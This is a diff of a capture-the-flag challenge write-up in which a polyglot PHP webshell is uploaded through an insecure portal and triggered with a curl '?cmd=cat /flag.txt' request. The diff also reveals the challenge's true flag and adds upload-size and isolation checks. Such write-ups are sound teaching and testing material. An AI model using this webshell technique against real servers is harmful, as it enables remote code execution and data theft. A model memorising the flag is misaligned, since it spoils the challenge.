@@ -3,13 +3,13 @@
 **Author:** Tanish Shah (`@tanishshahh`)  
 **Track:** Web & AI (Issue #6 / Challenge #15)  
 **Category:** Web  
-**Difficulty:** Hard (500 pts, Dynamic initial: 500, decay: 15, minimum: 100)  
+**Difficulty:** Hard — 700 → 350 pts (decay 12 solves)  
 **True Flag:** `case{php_webshell_rce_faculty_portal}`  
 
 ---
 
 ### 1. Narrative Lore & Storyline Context
-In AU Lab 207, Prof. Hasmukh Chelaiya set up an internal submission portal (`upload.php`) to collect assignment drafts and exam review questions. TA Piyush Pelaiya discovered that the server hosting this portal stored the upcoming **OOP 99** midterm exam flag in `/flag.txt`. By finding an insecure file upload flaw in the portal, Piyush managed to execute commands on the server to read and leak the confidential flag.
+In AU Lab 207, Prof. ManMishra Chelaiya set up an internal submission portal (`upload.php`) to collect assignment drafts and exam review questions. TA Piyush Pelaiya discovered that the server hosting this portal stored the upcoming **OOP 99** midterm exam flag in `/flag.txt`. By finding an insecure file upload flaw in the portal, Piyush managed to execute commands on the server to read and leak the confidential flag.
 
 ---
 
@@ -61,24 +61,26 @@ The server will respond:
 SUBMISSION SUCCESSFUL: File saved as: 0a1b2c_shell.phtml
 Access link: /uploads/0a1b2c_shell.phtml
 ```
-*(Note: To prevent multi-team overwrite collisions during concurrent lab triage, files are assigned an isolated prefix on disk while also maintaining a direct fallback for `/uploads/shell.phtml`).*
+*(Note: every upload is stored under a unique `abcdef_` prefix and **only** the link returned in the response resolves. There is no un-prefixed `/uploads/shell.phtml` fallback — that would let concurrent teams overwrite or resolve each other's shells.)*
 
 #### Step 3: Trigger Command Execution to Retrieve Flag
-Open the file in the browser or via `curl`:
+Open the **exact isolated link returned in Step 2** in the browser or via `curl`:
 ```bash
-curl "http://<LAN_IP>:5003/uploads/shell.phtml?cmd=cat%20/flag.txt"
+curl "http://<LAN_IP>:5003/uploads/0a1b2c_shell.phtml?cmd=cat%20/flag.txt"
 ```
 Output:
 ```
 case{php_webshell_rce_faculty_portal}
 ```
 
+**Upload limits:** submissions are capped at 2 MiB (`413 Payload Too Large` beyond that) and the upload directory is pruned to the 500 newest files, so a team cannot exhaust host memory or disk during the event.
+
 ---
 
 ### 4. Verification & Testing
 Run the automated solver script:
 ```bash
-python challenges/php2shell/solve.py http://127.0.0.1:5003
+uv run python challenges/php2shell/solve.py http://127.0.0.1:5003
 ```
 Expected output:
 ```
@@ -90,5 +92,10 @@ Expected output:
 [+] Polyglot file accepted by server.
 [*] Executing command via uploaded webshell (?cmd=cat /flag.txt)...
 [+] Flag extracted successfully: case{php_webshell_rce_faculty_portal}
+[+] Un-prefixed fallback correctly disabled (multi-team isolation).
+[*] Verifying two teams uploading the same filename stay isolated...
+[+] Distinct isolated links verified: /uploads/..., /uploads/...
+[*] Verifying upload size cap (3 MiB payload)...
+[+] Oversized upload rejected with 413.
 [SUCCESS] PHP2SHELL verification checks passed cleanly (Exit 0).
 ```
